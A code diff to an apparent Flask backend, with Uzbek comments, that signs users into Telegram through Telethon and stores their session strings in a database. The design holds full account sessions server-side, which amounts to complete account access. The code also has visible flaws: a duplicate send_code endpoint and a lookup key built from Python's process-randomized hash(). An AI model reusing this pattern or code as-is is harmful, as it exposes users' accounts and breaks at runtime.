@@ -37,53 +37,72 @@ def send_code():
         return jsonify({"status": "error", "message": str(e)})
 
 
-@app.route("/verify_code", methods=["POST"])
-@app.route("/login", methods=["POST"])
-def login():
+@app.route("/send_code", methods=["POST"])
+def send_code():
     phone = request.json.get("phone")
-    code = request.json.get("code")
-    password = request.json.get("password")  # ixtiyoriy
 
-    async def _login():
+    async def _send():
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
+        result = await client.send_code_request(phone)
+        session = client.session.save()
+        await client.disconnect()
+        return session
 
-        await client.send_code_request(phone)
+    session_str = asyncio.run(_send())
+
+    # vaqtincha sessionni DB ga yozamiz
+    conn = get_db()
+    cur = conn.cursor()
+    cur.execute("""
+        INSERT INTO telegram_sessions (user_id, session)
+        VALUES (%s, %s)
+        ON CONFLICT (user_id) DO UPDATE SET session = EXCLUDED.session
+    """, (hash(phone), session_str))
+    conn.commit()
+    conn.close()
+
+    return jsonify({"status": "ok"})
+
+@app.route("/verify_code", methods=["POST"])
+def verify_code():
+    phone = request.json.get("phone")
+    code = request.json.get("code")
+
+    conn = get_db()
+    cur = conn.cursor()
+    cur.execute("SELECT session FROM telegram_sessions WHERE user_id = %s", (hash(phone),))
+    row = cur.fetchone()
+    conn.close()
+
+    if not row:
+        return jsonify({"status": "error", "message": "Kod eskirgan"})
+
+    async def _verify():
+        client = TelegramClient(StringSession(row[0]), API_ID, API_HASH)
+        await client.connect()
 
         try:
             await client.sign_in(phone=phone, code=code)
         except SessionPasswordNeededError:
-            if not password:
-                raise Exception("2FA_REQUIRED")
-            await client.sign_in(password=password)
+            return "2fa"
 
         me = await client.get_me()
-        session_str = client.session.save()
-
+        session = client.session.save()
         await client.disconnect()
-        return me, session_str
+        return me, session
 
-    try:
-        me, session_str = asyncio.run(_login())
+    result = asyncio.run(_verify())
 
-        save_session(me.id, session_str)
+    if result == "2fa":
+        return jsonify({"status": "2fa_required"})
 
-        conn = get_db()
-        cur = conn.cursor()
-        cur.execute("""
-            INSERT INTO authorized_users (user_id, phone, username)
-            VALUES (%s, %s, %s)
-            ON CONFLICT (user_id) DO NOTHING
-        """, (me.id, phone, me.username))
-        conn.commit()
-        conn.close()
+    me, final_session = result
 
-        return jsonify({"status": "ok"})
+    save_session(me.id, final_session)
 
-    except Exception as e:
-        if str(e) == "2FA_REQUIRED":
-            return jsonify({"status": "2fa_required"})
-        return jsonify({"status": "error", "message": "Login amalga oshmadi"})
+    return jsonify({"status": "ok"})
+
 
         
 @app.route("/verify_password", methods=["POST"])
